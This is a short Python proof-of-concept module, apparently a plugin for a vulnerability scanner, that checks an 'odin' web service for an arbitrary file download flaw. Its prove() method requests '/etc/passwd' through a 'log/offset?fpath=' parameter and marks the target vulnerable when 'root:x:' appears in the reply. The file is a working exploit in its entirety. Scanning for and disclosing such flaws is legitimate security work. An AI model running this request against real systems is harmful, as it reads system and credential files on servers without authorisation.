#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'odin download'
        self.keyword = ['odin']
        self.info = 'odin download'
        self.type = 'download'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'log/offset?fpath=/etc/passwd&offset=0&num=200'
                async with session.get(url=url) as res:
                    if res!=None :
                        text = str(await res.read())
                        if "root:x:" in text:
                            self.flag = 1
                            self.res.append({"info": url, "key": 'odin download'})